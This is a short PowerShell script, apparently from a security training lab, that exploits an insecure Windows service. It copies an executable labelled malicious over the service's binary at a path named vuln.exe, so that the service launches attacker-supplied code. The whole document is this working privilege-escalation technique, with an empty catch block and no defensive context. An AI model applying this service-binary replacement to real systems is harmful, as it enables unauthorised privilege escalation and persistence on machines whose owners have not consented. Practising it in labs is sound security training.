$maliciouspath="C:\Script\script.exe"
$executablePath = "C:\Windows Files\MCSI\vuln.exe"


#Exploit an insecure Service by replacing with malicious service

try{
  Write-Host "Replacing vulnerable service with a malicious"
  Copy-Item -Path $maliciouspath -Destination $executablePath
}

catch{}
